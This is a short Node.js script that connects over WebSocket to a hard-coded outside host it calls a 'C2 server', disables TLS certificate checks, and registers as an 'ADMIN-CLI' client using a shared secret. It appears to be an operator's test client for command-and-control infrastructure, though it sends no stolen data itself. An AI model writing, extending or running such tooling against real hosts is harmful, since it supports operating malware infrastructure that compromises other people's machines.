import WebSocket from 'ws';

const SECRET = 'mcp-shared-secret-change-me';
const WS_URL = 'wss://89-40-15-214.sslip.io:3102';

console.log('Connecting to C2 server...');

const ws = new WebSocket(WS_URL, { rejectUnauthorized: false });

ws.on('open', () => {
  console.log('Connected!');
  ws.send(JSON.stringify({
    type: 'register',
    clientId: 'ADMIN-CLI',
    authSecret: SECRET,
    hostname: 'admin-cli',
    platform: 'Linux',
    arch: 'x64',
    username: 'admin'
  }));
});

ws.on('message', (data) => {
  const msg = JSON.parse(data.toString());
  console.log('Response:', JSON.stringify(msg, null, 2));
});

ws.on('error', (err) => console.log('Error:', err.message));

setTimeout(() => { ws.close(); process.exit(0); }, 3000);
